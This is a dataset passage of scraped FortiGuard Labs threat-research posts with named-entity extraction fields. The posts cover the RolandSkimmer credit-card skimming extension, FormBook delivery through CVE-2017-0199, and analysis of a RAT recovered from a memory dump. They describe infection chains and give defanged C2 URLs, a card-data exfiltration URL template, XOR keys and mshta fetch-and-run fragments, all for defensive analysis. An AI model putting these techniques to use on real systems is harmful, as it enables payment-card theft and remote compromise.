these files are XOR-encoded and require decoding using the key “andromeda.” The following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities. The attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites. The extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions: This combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception. The background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code. To generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions. The script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—<imaage> instead of a valid <img> or <image> tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js. The background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.The retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.” The malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5). After detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden <a> elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft. Once the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number): hxxps://bg3dsec[.]com/<randomized str>?S=<useridentifier>-<site>&D=<captured form data>?&N=<credit card number> Attackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS). The critical component of this attack lies in the maliciously crafted LNK file with the following arguments: --load-extension=”%LOCALAPPDATA%\\s2ch97” ----mark-non-secure-as=disabled. The LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment. The attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.” These decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation. By leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled. Once all the browsers’ related settings are complete, mshta.exe is killed. Upon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented. These logs included status messages such as: These logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly. “RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information. The attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity. The malware described in this report are detected and blocked byFortiGuard Antivirusas: LNK/Agent.96F1!trJS/Agent.SOM!trVBS/Agent.ABUE!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard CDR(content disarm and reconstruction) service can disarm the malicious macros within the document. We also suggest that organizations take the free FortinetFortinet Certified Fundamentals (FCF)cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact the GlobalFortiGuard Incident Response Team. invsetmx[.]comfzhivka-001-site1[.]btempurl[.]comexmkleo[.]combg3dsec[.]comzzigi20-001-site1.atempurl.comtopclima-001-site1.itempurl.comrinootracebg-001-site1.etempurl.commgproperties-001-site1.itempurl.comkleoti-001-site1.htempurl.com 80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d 86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f17086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0 4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2cd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53c02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb45810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c Cara Lin FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (Threat Research, Activity), (Windows, Platform), (RolandSkimmer, Malware), (Bulgaria, Country), (Chrome, Browser), (Edge, Browser), (Firefox, Browser), (Faktura_3716804.zip, File), (faktura_1065170.lnk, File), (Windows\\System32\\MShta.exe, Tool), (GeT, Command), (iNVsetmX.com, Domain), (ipA.AsPX, URL), (Windows\\System32\\MShta.exe, Tool), (seT, Command), (mi1, Object), (msxmL2.ServerXMLHttp6.0, Class), (mi1.Open, Method), (http://iNVsetmX.[.]com/ipa.AsPX, URL), (windows.System32.MShta.exe, Tool), (vbscript, Language), (execute, Function), (Set, Command), (mi1.CreateObject, Method), (msxmL2.ServerXMLHttp6.0, Class), (mi1.open, Method), (http://iNVsetmX.[.]com/ipa.AsPX, URL), (windows.system32.mshta.exe, tool), (vbscript, language), (execute, function), (set, command), (mi1.createobject, method), (",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "Threat Research",
          "Activity"
        ],
        [
          "Windows",
          "Platform"
        ],
        [
          "RolandSkimmer",
          "Malware"
        ],
        [
          "Bulgaria",
          "Country"
        ],
        [
          "Chrome",
          "Browser"
        ],
        [
          "Edge",
          "Browser"
        ],
        [
          "Firefox",
          "Browser"
        ],
        [
          "Faktura_3716804.zip",
          "File"
        ],
        [
          "faktura_1065170.lnk",
          "File"
        ],
        [
          "Windows\\System32\\MShta.exe",
          "Tool"
        ],
        [
          "GeT",
          "Command"
        ],
        [
          "iNVsetmX.com",
          "Domain"
        ],
        [
          "ipA.AsPX",
          "URL"
        ],
        [
          "Windows\\System32\\MShta.exe",
          "Tool"
        ],
        [
          "seT",
          "Command"
        ],
        [
          "mi1",
          "Object"
        ],
        [
          "msxmL2.ServerXMLHttp6.0",
          "Class"
        ],
        [
          "mi1.Open",
          "Method"
        ],
        [
          "http://iNVsetmX.[.]com/ipa.AsPX",
          "URL"
        ],
        [
          "windows.System32.MShta.exe",
          "Tool"
        ],
        [
          "vbscript",
          "Language"
        ],
        [
          "execute",
          "Function"
        ],
        [
          "Set",
          "Command"
        ],
        [
          "mi1.CreateObject",
          "Method"
        ],
        [
          "msxmL2.ServerXMLHttp6.0",
          "Class"
        ],
        [
          "mi1.open",
          "Method"
        ],
        [
          "http://iNVsetmX.[.]com/ipa.AsPX",
          "URL"
        ],
        [
          "windows.system32.mshta.exe",
          "tool"
        ],
        [
          "vbscript",
          "language"
        ],
        [
          "execute",
          "function"
        ],
        [
          "set",
          "command"
        ],
        [
          "mi1.createobject",
          "method"
        ]
      ],
      "relationships": [],
      "has_entities": true
    },
    "entity_count": 33,
    "relationship_count": 0
  },
  {
    "title": "How a Malicious Excel File (CVE-2017-0199) Delivers the FormBook Payload",
    "link": "https://www.fortinet.com/blog/threat-research/how-a-malicious-excel-file-cve-2017-0199-delivers-the-formbook-payload",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Control and Collect Sensitive Information from a Victim’s DeviceSeverity level:Critical FortiGuard Labs recently observed a high-severity phishing campaign targeting old version Office Application users through malicious email attachments. The emails deliver an Excel file designed to exploit theCVE-2017-0199vulnerability, a known flaw in old version Microsoft Office's OLE (Object Linking and Embedding) functionality. The malware being spread in this campaign is FormBook, an information-stealing malware known for its ability to capture sensitive data, including login credentials, keystrokes, and clipboard information. Upon opening the malicious Excel file, the malware performs a series of operations, ultimately running the FormBook payload. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The phishing campaign starts with an email disguised as a sales order urging the recipient to open an attached Excel document. As shown in Figure 1, FortiMail has flagged the email as “[virus detected]” in the Subject line to warn the recipient. CVE-2017-0199 is a logic vulnerability found in older versions of the Office Application (Office 2007/2010 /2013 /2016). When a user opens the attached Office document targeting this vulnerability, the program sends an HTTP request to a remote server to retrieve a malicious HTA file. The program then uses COM objects to find the application/HTA file handler, which causes the Microsoft HTA application (mshta.exe) to load and execute the malicious script. Figure 2 shows how CVE-2017-0199 works: We opened the Office document from the email attachment using a compression program, which allowed us to directly view the OLE object content, as shown in Figure 3. If we had opened the Office document within a vulnerable version of Office, it would have triggered CVE-2017-0199, causing the download and execution of the linked content. As you can see, this is a very long URL. However, when accessing it normally, we don't need to pay attention to the content between the protocol and the '@' symbol. This allows us to obtain the actual URL we need. (hxxps[:]//agr[.]my/P6bJNr) Figure 4 shows the discovery of the shortened URL. When this link is accessed, it triggers a 302 redirect that jumps to the actual destination address. If you would like to learn this vulnerability in greater depth, this article provides a more thorough analysis:An Inside Look at CVE-2017-0199 – HTA and Scriptlet File Handler Vulnerability CVE-2017-0199 is a vulnerability dating back eight years, for which official patches have already been released. Nevertheless, due to the inherent challenges of vulnerability management and remediation—encompassing outdated software systems, overburdened IT teams, organizational negligence, or technical incompetence—organizations that fail to promptly update their systems, apply patches inconsistently, or implement security measures carelessly remain susceptible to exploitation of this vulnerability. We can see that the downloaded script is an HTA file (Figure 5), with its main execution logic being a segment of base64-encoded content. After decoding the base64 content, we found that its core functionality is to download a new file, place it in the %APPDATA% directory, and then execute it. (Figure 6) By analyzing sections of the obtained sample, we observed that its .rsrc section contains an unformatted resource data entry named “SCRIPT,” as shown in Figure 7. Examining its content revealed that it begins with the byte sequence “A3 48 4B BE 98 6C 4A A9 99 4C 53 0A 86 D6 48 7D”, which is characteristic of executable files generated by Aut2Exe from AutoIt scripts. Using a debugger for dynamic analysis, we attempted to examine how the sample decrypts the content of the SCRIPT resource and executes the payload, as shown in Figure 8. After initially reading and verifying the \"SCRIPT\" resource, the sample uses the IsDebuggerPresent API for anti-debugging measures, as shown in Figure 9. If it detects that the program is being debugged, it will only output, \"This is a third-party compiled AutoIt script.\" Afterwards, the sample reads the \"SCRIPT\" resource again and decrypts its contents, as shown in Figure 10. After thorough analysis, we discovered that the script decodes the encoded content using 0x1Em and extracts a file called “springmaker” from itself to the %TEMP% directory. It then calls CallWindowProc to run the decoded content, as shown in Figure 11. By examining the content of the “springmaker” file and decompiling what CallWindowProc executes, we discovered that the “springmaker” file is XORed with the string “3NQXSHDTVT2DPK06”, as shown in Figure 12. By applying the same XOR operation using that same string, we can restore the original file. At this point, we have finally obtained the core payload, which is the FormBook malware, as shown in Figure 13. If you would like to learn more about FormBook, here is a recent analysis:Infostealer Malware FormBook Spread via Phishing Campaign – Part II This is a serious phishing campaign targeting Windows users. The attackers send emails with malicious Excel attachments that exploit the CVE-2017-0199 vulnerability to deploy the FormBook malware. The attack process involves distributing malicious Excel files through phishing emails and exploiting CVE-2017-0199 to download and execute malicious HTA files. The HTA file downloads and executes \"sihost.exe,\" which in turn extracts \"springmaker.\" Finally, the \"springmaker\" file is decoded into the FormBook malware. The entire process is shown in Figure 14. This attack aims to take control of victims' devices and steal sensitive information, posing a significant threat. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services as follows: The relevant URLs are rated as “Malicious Websites” by theFortiGuard Web Filtering service. FortiMailrecognizes the phishing email as “virus detected.” In addition, real-time anti-phishing provided by FortiSandbox, embedded in Fortinet’s FortiMail, web filtering, and antivirus solutions, provides advanced protection against both known and unknown phishing attempts. FortiGuard IPS servicedetects the vulnerability exploit against CVE-2017-0199 with the signature “MS.Office.OLE.autolink.Code.Execution”. FortiGuard Antivirus service detects the malicious Excel document, the HTA file, the malicious sihost.exe file as well as the decrypted FormBook with the following AV signatures. MSExcel/CVE_2017_0199.G1!exploitVBS/Obfuscated.AO!trAutoIt/Injector.GKX!trW32/Formbook.AA!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. To stay informed of new and emerging threats, you cansign upto receive future alerts. We also suggest our readers go through the free NSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxp[:]//172[.]245[.]123[.]32/xampp/hh/wef[.]htahxxp[:]//172[.]245[.]123[.]32/199/sihost[.]exe [AprilSAO2025.xls]33A1696D69874AD86501F739A0186F0E4C0301B5A45D73DA903F91539C0DB427 [wef.hta]2BFBF6792CA46219259424EFBBBEE09DDBE6AE8FD9426C50AA0326A530AC5B14 [siHOST.exe]7E16ED31277C31C0370B391A1FC73F77D7F0CD13CC3BAB0EAA9E2F303B6019AF [springmaker]A619B1057BCCB69C4D00366F62EBD6E969935CCA65FA40FDBFE1B95E36BA605D [FormBook / Decrypted springmaker]3843F96588773E2E463A4DA492C875B3241A4842D0C087A19C948E2BE0898364 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs Threat Research, Entity), (Microsoft Windows, Platform), (Windows Users, Targeted Party), (FormBook, Malware), (CVE-2017-0199, Vulnerability), (Figure 1, Image), (FortiMail, Tool), (virus detected, Alert)\nRelationships: (FortiGuard Labs Threat Research, affectedPlatforms, Microsoft Windows), (FortiGuard Labs Threat Research, impactedParties, Windows Users), (FortiGuard Labs Threat Research, impact, Control and Collect Sensitive Information from a Victim’s Device), (FortiGuard Labs Threat Research, severityLevel, Critical), (FortiGuard Labs Threat Research, recentObservations, High-severity Phishing Campaign), (FortiGuard Labs Threat Research, startedCampaign, Email), (FortiGuard Labs Threat Research, usedEmail, Excel document), (FortiGuard Labs Threat Research, exploitedVulnerability, CVE-2017-0199), (FortiGuard Labs Threat Research, deliveredMalware, FormBook), (FortiGuard Labs Threat Research, performedOperations, Series of Operations), (FortiGuard Labs Threat Research, ranPayload, FormBook), (FortiGuard Labs Threat Research, referencedImage, Figure 1), (FortiGuard Labs Threat Research, flaggedEmail, [virus detected]), (FortiGuard Labs Threat Research, alertedRecipient, FortiMail), (",
      "entities": [
        [
          "FortiGuard Labs Threat Research",
          "Entity"
        ],
        [
          "Microsoft Windows",
          "Platform"
        ],
        [
          "Windows Users",
          "Targeted Party"
        ],
        [
          "FormBook",
          "Malware"
        ],
        [
          "CVE-2017-0199",
          "Vulnerability"
        ],
        [
          "Figure 1",
          "Image"
        ],
        [
          "FortiMail",
          "Tool"
        ],
        [
          "virus detected",
          "Alert"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs Threat Research",
          "affectedPlatforms",
          "Microsoft Windows"
        ],
        [
          "FortiGuard Labs Threat Research",
          "impactedParties",
          "Windows Users"
        ],
        [
          "FortiGuard Labs Threat Research",
          "impact",
          "Control and Collect Sensitive Information from a Victim’s Device"
        ],
        [
          "FortiGuard Labs Threat Research",
          "severityLevel",
          "Critical"
        ],
        [
          "FortiGuard Labs Threat Research",
          "recentObservations",
          "High-severity Phishing Campaign"
        ],
        [
          "FortiGuard Labs Threat Research",
          "startedCampaign",
          "Email"
        ],
        [
          "FortiGuard Labs Threat Research",
          "usedEmail",
          "Excel document"
        ],
        [
          "FortiGuard Labs Threat Research",
          "exploitedVulnerability",
          "CVE-2017-0199"
        ],
        [
          "FortiGuard Labs Threat Research",
          "deliveredMalware",
          "FormBook"
        ],
        [
          "FortiGuard Labs Threat Research",
          "performedOperations",
          "Series of Operations"
        ],
        [
          "FortiGuard Labs Threat Research",
          "ranPayload",
          "FormBook"
        ],
        [
          "FortiGuard Labs Threat Research",
          "referencedImage",
          "Figure 1"
        ],
        [
          "FortiGuard Labs Threat Research",
          "flaggedEmail",
          "[virus detected]"
        ],
        [
          "FortiGuard Labs Threat Research",
          "alertedRecipient",
          "FortiMail"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 8,
    "relationship_count": 14
  },
  {
    "title": "Deep Dive into a Dumped Malware without a PE Header",
    "link": "https://www.fortinet.com/blog/threat-research/deep-dive-into-a-dumped-malware-without-a-pe-header",
    "content": "FortiGuard Labs Threat Research This analysis is part of an incident investigation led by the FortiGuard Incident Response Team. We discovered malware that had been running on a compromised machine for several weeks. The threat actor had executed a batch of scripts and PowerShell to run the malware in a Windows process. Although obtaining the original malware executable was difficult, a memory dump of the running malware process and a full memory dump of the compromised machine (the “fullout” file, size 33GB) were successfully acquired. Figure 1 provides detailed file information about the dumped memory file, “fullout,” which we scanned to build a local test environment for analyzing the malware. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The malware was running within a dllhost.exe process with PID 8200. The dumped file is named pid.8200.vad.0x1c3eefb0000-0x1c3ef029fff.dmp. The file name reveals that the malware was loaded and deployed in memory at address range 0x1c3eefb0000 to 0x1c3ef029fff. The dumped file is a deployed 64-bit PE (Portable Executable) file. During execution, the Windows Loader reads and parses its DOS and PE headers to load and deploy the PE file. Once deployed, these headers are no longer needed. To evade dumping the malware into a file for analysis by researchers, some malware often corrupts these header regions by overwriting them with zeros (like this one) or random data. As shown in Figure 2, both the DOS and PE headers are corrupted, making it difficult to reconstruct the entire executable from memory. To dynamically analyze the malware, we needed to replicate the compromised system’s environment locally. This required launching the dllhost.exe process in a debugger to serve as a target process for deploying the dumped malware. This would allow us to analyze the malware within a local analysis environment. Preparing the malware to execute properly in this controlled setting involves several complicated steps. The first step is to locate the entry point function (the start function), which is the initial code executed when the malware is loaded into memory by the Windows Loader. While the offset of the entry point function is typically stored in the PE header, this was not the case. Instead, we had to manually locate the entry point (the start function). Based on our experience, the first instruction of the entry function is typically compiled as “sub rsp, 28h,” but other functions may also contain this instruction. However, by dumping the malware in IDA Pro, we were able to search for all occurrences of this instruction in the IDA Pro database. Fortunately, only eight instances of the instruction appeared in the malware (Figure 3). After analysis, we confirmed that the fourth function (at 0x1C3EEFEE0A8) is the entry point. In a newly launched dllhost.exe process, we manually executed some instructions to allocate memory for deploying the dumped malware, as seen in Figure 4. It calls a relevant VirtualAlloc() API with the same base address—0x1C3EEB70000—as seen in the compromised system. Once allocated, the dumped malware was copied into the newly created memory. A PE file’s Import table lists the Windows APIs it depends on. These API loading addresses differ on different Windows systems. To run and analyze the dumped malware in the local system, these addresses needed to be relocated to the ones loaded in the local system. Figure 5 shows part of the Windows API addresses from the Import Table. Based on our analysis, the final API address can be calculated from this information. For instance, the API address at 0x1C3EF0240D0 is 0x1C3EEEE1CE0, as shown in Figure 5. It calculates the API address as 0x7FFD74224630 by executing the following ASM code at address 0x1C3EEEE1CE0h: 001C3EEEE1CE0movr10, 0E528F49552F112B4h 001C3EEEE1CEAmovr11, 0E5288B6826D35484h 001C3EEEE1CF4xorr11, r10 001C3EEEE1CF7jmpr11; 0x7FFD74224630 Using the Volatility tool, we listed the loaded modules in the dllhost.exe process (PID 8200) from the “fullout” file. As you can see in Figure 6, the API at 0x7FFD74224630 is exported from module GDI32.dll. By dumping the GDI32.dll from the “fullout” file and analyzing it, we determined that the API at address 0x7FFD74224630 corresponds to GetObjectW() in the compromised system. In our local test environment, this same API resides at address 0x07FFFF77CB870. For this API,  its original address was replaced with the local address. This malware has 257 Windows APIs requiring relocation across 16 modules, including: kernel32.dll ws2_32.dll ntdll.dll gdi32.dll shlwapi.dll sspicli.dll user32.dll shell32.dll msvcrt.dll advapi32.dll, comctl32.dll crypt32.dll gdiplus.dll ole32.dll rpcrt4.dll userenv.dll For each API in the Import Table, its original address must be replaced with its corresponding local address using the same method used for API GetObjectW(). In addition, we needed to load all the required modules that were not automatically loaded by dllhost.exe. To do this, the API LoadLibraryA() or LoadLibraryW() with the module name must be called to load them into the malware’s memory. Figure 7 shows the malware running in a debugger. The RIP register points to the entry point's address at 0x1C3EEFEE0A8. The debugger also shows some of the relocated Windows API functions at the bottom. Based on our analysis, the malware also required some global variable data located at address 0x1C3EEB7000 with a size of 0x5A000 bytes. We extracted the required global data from the “fullout” file using the Volatility tool and the dd command. We again called the VirtualAlloc() API to allocate a new memory region within the dllhost.exe process at the desired address and size. After successful allocation, the extracted data was copied into the newly allocated memory space, as shown in Figure 8. Static analysis of the malware’s entry point function reveals that the function requires three parameters. The first parameter (RCX) is the base address of the loaded malware, which in this case is 0x1C3EEFB0000. The value of the second parameter (RDX) is 0x1. The third parameter (R8) is a pointer to a 0x30-byte buffer, which can also be extracted from the “fullout” file. We prepared all three parameters accordingly and allocated additional memory to store the 30H data for the third parameter, as illustrated in Figure 9. The last critical item is the correct alignment of the RSP register. When breaking at the entry point, the lowest four bits of the RSP value must be 0x8, as shown in Figure 9. Failing to align the RSP properly can trigger an exception of EXCEPTION_ACCESS_VIOLATION (code 0xC0000005) when the malware starts. This is due to a misalignment error, particularly when executing instructions like “movdqa,” which requires 16-byte alignment. In 64-bit code mode, before calling the entry point function, the RSP’s value is 16-byte aligned (the lowest four bits are 0x0). It pushes the return address onto the stack, and the RSP value is minus eight. To correct this, we adjusted the value from 0x09CAD11D850 to 0x09CAD11D848. After multiple trials, errors, and repeated fixes, we finally managed to run the malware in the local environment. Upon execution, the malware calls a function to decrypt its C2 server domain information stored in memory. As shown in Figure 10, the decryption function is displayed along with the newly decrypted domain details, including the domain (\"rushpapers.com\") and port number (\"443\"). The malware then establishes communication with its C2 server by creating a thread. As shown in Figure 11, it prepares to invoke the CreateThread() API with the thread function at 0x1C3EEFDE300. The newly created thread is responsible for handling communication with its C2 server. Part of the thread’s code is shown on the right side of Figure 11. After launching the thread, the main thread enters a sleep state until the communication thread completes its execution. As the decrypted domain port “443” indicates, the malware communicates with the C2 server over the TLS protocol. It uses the getaddrinfo() API to obtain the domain “rushpapers.com” IP address via a DNS query. Figure 12 is a Wireshark capture of the network traffic generated by the malware as it communicates with its C2 server. Since the TLS packet is encrypted, we need to inspect the data before encryption or after decryption to view the plaintext content. This can be done by setting breakpoints in a debugger on both encryption and decryption routines used by this malware. The malware leverages two API functions, SealMessage() and DecryptMessage(), to encrypt and decrypt the data for the TLS traffic. As you can see in Figure 13, the malware is preparing to encrypt an HTTP GET request using the SealMessage() API. Below are two examples of plaintext packets--one sent and one received--: Request packet (before TLS encryption): GET /ws/ HTTP/1.1 Host: rushpapers[.]com Connection: Upgrade Upgrade: websocket Sec-WebSocket-Version: 13 Sec-WebSocket-Key: OCnq155rYct3ykkkdLrjvQ== Response packet (after TLS decryption): HTTP/1.1 101 Switching Protocols Server: nginx/1.18.0 Date: Fri, 28 Mar 2025 06:13:24 GMT Connection: upgrade Upgrade: websocket Sec-WebSocket-Accept: Bzr0K1o6RJ4bYvvm4AM5AAG172Y= These two plaintext packets are used to complete a handshake-like process. Afterward, it switchesto a custom encryption algorithm to encrypt the packet data before applying TLS encryption. Below is an example of the data that has been encrypted using the custom algorithm. 0000000082 A6 16 98 5C 75 59 CB66 55 41 F1 32 11 79 EF‚¦ ˜\\uYËfUAñ2 yï 000000102F 55 27 A8 7C 5A 36 AE68 58 74 F1 28 55 3E A9/U'¨|Z6®hXtñ(U>© 000000206C 5B 26 B6 6D 4C 26 AC69 5C 1B 92l[&¶mL&¬i\\ ’ A clearer breakdown of the data is in the table below: Offset Length Description 00 01 Magic tag.0x82 01 Variable Variable-extended-length. 0xA6 for this case. 02 04 Encryption key. 16 98 5C 75 06 26H Encrypted data. 59 CB66 … 1B 92 According to the variable-extended-length rule, the data size is calculated as 0xA6-0x80=0x26. The encryption key (such as 0x755C9816) is a randomly generated number. The custom encryption’s algorithm performs a repeated XOR operation between each byte of the key and the encrypted data bytes. As a result, the decrypted data is as follows: 000000004F 53 3A 20 57 69 6E 646F 77 73 20 31 30 20 2FOS: Windows 10 / 0000001020 36 34 2D 62 69 74 2028 31 30 2E 30 2E 31 3964-bit (10.0.19 0000002030 34 35 29 0D 0A045) The decrypted data clearly reveals the system information from our local test environment: \"OS: Windows 10 / 64-bit (10.0.19045)\\r\\n”. This information is collected and sent to the C2 server when requested by the C2 server. Below is a code snippet demonstrating the custom algorithm used to encrypt and decrypt the data. […] 001C3EF00CED3 loc_1C3EF00CED3:; CODE XREF: sub_1C3EF00CE08+FD↓j 001C3EF00CED3moveax, r9d 001C3EF00CED6andeax, 80000003h 001C3EF00CEDBjgeshort loc_1C3EF00CEE4 001C3EF00CEDDdeceax 001C3EF00CEDForeax, 0FFFFFFFCh 001C3EF00CEE2inceax 001C3EF00CEE4 001C3EF00CEE4 loc_1C3EF00CEE4:; CODE XREF: sub_1C3EF00CE08+D3↑j 001C3EF00CEE4movecx, [rbx+30h] 001C3EF00CEE7addecx, r9d 001C3EF00CEEAcdqe 001C3EF00CEECincr9d 001C3EF00CEEFmovr8b, byte ptr [rsp+rax+28h+arg_0];; the random key 001C3EF00CEF4xorr8b, [r10];;;;;;; encrypt/decrypt the data with random key. 001C3EF00CEF7incr10 001C3EF00CEFAmovrax, [rbx+20h] 001C3EF00CEFEmov[rcx+rax], r8b 001C3EF00CF02cmpr9d, edi; edi is data size 001C3EF00CF05jlshort loc_1C3EF00CED3 001C3EF00CF07 001C3EF00CF07 loc_1C3EF00CF07:; CODE XREF: sub_1C3EF00CE08+C6↑j 001C3EF00CF07add[rbx+30h], edi 001C3EF00CF0Ajmploc_1C3EF00CE55 […] Through a comprehensive analysis of its API calls and execution flow, we have confirmed this malware to be aRAT(Remote Access Trojan). This section details the malware’s capabilities for controlling the compromised system. The malware has a feature that captures the victim’s screen as JPEG images and exfiltrates them to its C2 server. It also collects the title of the current active (topmost) program to provide context about what the user is doing at the time of capture. To do this, it calls a sequence of APIs, including CreateStreamOnHGlobal(), GdiplusStartup(), GetSystemMetrics(), CreateCompatibleDC(), CreateCompatibleBitmap(), BitBlt(), GdipCreateBitmapFromHBITMAP(), GdipSaveImageToStream(), and GdipDisposeImage(). Figure 14 shows how the malware captures the screenshot by calling these APIs. The malware includes a thread function designed to act as a server, listening on a TCP port specified by the C2 server. Once activated, this function allows the malware to await incoming connections from the attacker. It implements a multi-threaded socket architecture: each time a new client (attacker) connects, the malware spawns a new thread to handle the communication. This design enables concurrent sessions and supports more complex interactions. By operating in this mode, the malware effectively turns the compromised system into a remote-access platform, allowing the attacker to launch further attacks or perform various actions on behalf of the victim. The malware can enumerate and manipulate the system services on the infected machine. It achieves this by leveraging several Windows Service Control Manager (SCM) APIs, including OpenSCManagerW(), EnumServicesStatusExW(), ControlService(), and more. This analysis successfully demonstrated the deployment and dynamic analysis of malware with corrupted DOS and PE headers in a controlled local environment. The detailed process—from preparing the malware for execution, including memory allocation and API resolution, to correcting execution parameters—ensured accurate emulation of the malware’s behavior. Our investigation into the payload revealed its sophisticated communication with the C2 server, including secure encryption and decryption mechanisms using the SealMessage() and DecryptMessage() APIs. Finally, we confirmed the malware’s significant capabilities on the compromised system, such as screen capture, remote server functionality, and manipulation of system services via Service Control Manager APIs. Fortinet protects against these attacks, and theFortiGuard IR teamis available to assist you whenever needed. Fortinet customers are already protected from this malware with FortiGuard’s AntiVirus, Web Filtering, and Anti-Botnet services  as follows: The relevant C2 server URL is rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. You cansign upfor future alerts and stay informed of new and emerging threats. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. URLs hxxps[:]//rushpapers[.]com/ws/ Sha256 F3EB67B8DDAC2732BB8DCC07C0B7BC307F618A0A684520A04CFC817D8D0947B9 